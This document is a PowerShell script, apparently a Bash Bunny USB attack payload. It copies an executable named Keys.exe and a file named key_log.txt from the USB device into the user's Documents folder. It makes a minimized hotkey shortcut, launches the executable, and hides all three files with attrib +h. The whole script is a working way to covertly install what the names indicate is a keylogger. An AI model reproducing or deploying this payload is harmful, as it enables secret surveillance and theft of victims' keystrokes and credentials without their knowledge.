$user = $env:UserName
copy ((gwmi win32_volume -f 'label=''BASHBUNNY''').Name+'payloads/switch1/Keys.exe') C:\Users\$user\Documents
copy ((gwmi win32_volume -f 'label=''BASHBUNNY''').Name+'payloads/switch1/key_log.txt') C:\Users\$user\Documents
#Create a wscript.shell object
$ComObj = New-Object -ComObject WScript.Shell

#Use the createshortcut method and assign to a variable
$ShortCut = $ComObj.CreateShortcut("C:\Users\"+$user+"\Documents\Keys.lnk")

#Path to file shorcut will open
$ShortCut.TargetPath = "C:\Users\"+$user+"\Documents\Keys.exe"

#Describe the shortcut
$ShortCut.Description = "This is my shortcut! Rawr!"

#Returns the fullpatth you defined for the shortcut
$ShortCut.FullName 

#How the window will behave when opened
$ShortCut.WindowStyle = 7
#1 - Activates and displays a window. If the window is minimized or maximized, the system restores it to its original size and position.
#3 - Activates the window and displays it as a maximized window.
#7 - Minimizes the window and activates the next top-level window.

#Create a hotkey shortcut for your shortcut
$ShortCut.Hotkey = "CTRL+SHIFT+F5"
#Modifiers include - ALT+, CTRL+, SHIFT+, EXT+.
#KeyName - a ... z, 0 ... 9, F1 .. F12

#Provide an icon for your shortcut
$ShortCut.IconLocation = "$Env:USERPROFILE\desktop\favicon.ico"
#If left blank it will use the icon for the file you're calling

$ShortCut.Save()


cd C:\Users\$user\Documents\

./Keys.exe

cd\


cd C:\Users\$user\Documents
attrib +h "Keys.exe"
attrib +h "Keys.lnk"
attrib +h "key_log.txt"
